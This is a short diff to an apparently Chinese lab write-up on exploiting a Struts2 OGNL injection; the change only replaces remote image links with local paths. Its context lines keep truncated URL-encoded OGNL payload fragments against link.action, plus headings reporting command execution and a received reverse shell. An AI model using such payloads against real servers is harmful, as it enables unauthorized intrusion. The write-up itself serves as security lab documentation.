@@ -50,7 +50,7 @@ http://your-vps-ip:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMet
 
 成功执行命令`id`：
 
-![image-20220301174558051](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011745146.png)
+![image-20220301174558051](./images/202203011745146.png)
 
 ### 反弹shell
 
@@ -87,4 +87,4 @@ GET /link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dt
 
 成功接收反弹shell：
 
-![image-20220301174700233](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011747317.png)
+![image-20220301174700233](./images/202203011747317.png)
